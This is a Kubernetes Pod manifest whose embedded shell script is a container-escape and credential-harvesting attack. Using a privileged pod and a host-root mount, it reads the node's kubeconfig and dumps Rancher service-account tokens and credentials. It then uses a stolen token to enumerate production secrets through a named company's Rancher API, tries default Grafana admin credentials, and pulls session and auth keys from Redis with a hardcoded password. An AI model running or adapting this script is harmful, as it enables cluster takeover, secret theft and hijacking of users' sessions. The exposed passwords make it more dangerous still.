
apiVersion: v1
kind: Pod
metadata:
  name: network-access
  namespace: egam-production
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: shell
    image: alpine:3.19
    command:
      - /bin/sh
      - -c
      - |
        apk add --no-cache util-linux curl jq openssl redis > /dev/null 2>&1

        # Installa kubectl
        curl -LO "https://dl.k8s.io/release/v1.30.0/bin/linux/amd64/kubectl" 2>/dev/null
        chmod +x kubectl && mv kubectl /usr/local/bin/ 2>/dev/null

        export KUBECONFIG=/host/etc/rancher/rke2/rke2.yaml

        echo "=========================================="
        echo "=== 1. RANCHER SA TOKEN (cattle-token) ==="
        echo "=========================================="
        kubectl get secret cattle-token-g684b -n cattle-system -o jsonpath='{.data.token}' 2>&1 | base64 -d 2>&1
        echo ""
        echo "--- CA ---"
        kubectl get secret cattle-token-g684b -n cattle-system -o jsonpath='{.data.ca\.crt}' 2>&1 | base64 -d 2>&1 | head -3
        echo ""
        echo "--- NAMESPACE ---"
        kubectl get secret cattle-token-g684b -n cattle-system -o jsonpath='{.data.namespace}' 2>&1 | base64 -d 2>&1
        echo ""

        echo "=========================================="
        echo "=== 2. RANCHER TOKEN (all tokens) ==="
        echo "=========================================="
        kubectl get secrets -n cattle-system -o json 2>&1 | jq -r '.items[] | select(.type == "kubernetes.io/service-account-token") | .metadata.name + ": " + (.data.token | @base64d)' 2>&1 | head -20 || echo "NOT FOUND"

        echo "=========================================="
        echo "=== 3. RANCHER LOGIN TOKEN (from cattle-credentials) ==="
        echo "=========================================="
        kubectl get secret cattle-credentials-269b1fd2be -n cattle-system -o json 2>&1 | jq -r '.data | to_entries[] | .key + "=" + (.value | @base64d)' 2>&1 || echo "NOT FOUND"

        echo "=========================================="
        echo "=== 4. PRODUCTION CLUSTER TOKENS ==="
        echo "=========================================="
        # Prova con il token SA
        SA_TOKEN=$(kubectl get secret cattle-token-g684b -n cattle-system -o jsonpath='{.data.token}' 2>/dev/null | base64 -d 2>/dev/null)
        echo "SA_TOKEN: ${SA_TOKEN:0:30}..."
        echo ""
        # Chiama Rancher API con il token SA
        curl -k -H "Authorization: Bearer $SA_TOKEN" "https://rancher.management.egam.com.br/v3/clusters" 2>&1 | head -c 500
        echo ""

        echo "=========================================="
        echo "=== 5. PRODUCTION SECRETS (via Rancher API) ==="
        echo "=========================================="
        curl -k -H "Authorization: Bearer $SA_TOKEN" "https://rancher.management.egam.com.br/k8s/clusters/c-m-5zwstccv/v1/secrets?limit=500" 2>&1 | jq -r '.items[]? | .metadata.namespace + "/" + .metadata.name' 2>&1 | head -100 || echo "FAILED"

        echo "=========================================="
        echo "=== 6. ALL NAMESPACES IN PRODUCTION ==="
        echo "=========================================="
        curl -k -H "Authorization: Bearer $SA_TOKEN" "https://rancher.management.egam.com.br/k8s/clusters/c-m-5zwstccv/v1/namespaces" 2>&1 | jq -r '.items[]? | .metadata.name' 2>&1 | head -30 || echo "FAILED"

        echo "=========================================="
        echo "=== 7. GRAFANA DATASOURCES (login) ==="
        echo "=========================================="
        # Usa Grafana per accedere a Prometheus/Loki
        curl -k -u "admin:prom-operator" "https://grafana.management.egam.com.br/api/datasources" 2>&1 | head -c 500 || true
        echo ""

        echo "=========================================="
        echo "=== 8. REDIS SESSIONS (search for tokens) ==="
        echo "=========================================="
        redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP KEYS '*' 2>/dev/null | grep -iE "token|auth|session|login|user" | head -20 | while read k; do
          echo "KEY: $k"
          redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP GET "$k" 2>/dev/null | head -c 200
          echo ""
          echo "---"
        done

        echo "=========================================="
        echo "=== DONE ==="
        echo "=========================================="
        sleep 36000
    securityContext:
      privileged: true
    volumeMounts:
    - mountPath: /host
      name: host
  volumes:
  - name: host
    hostPath:
      path: /
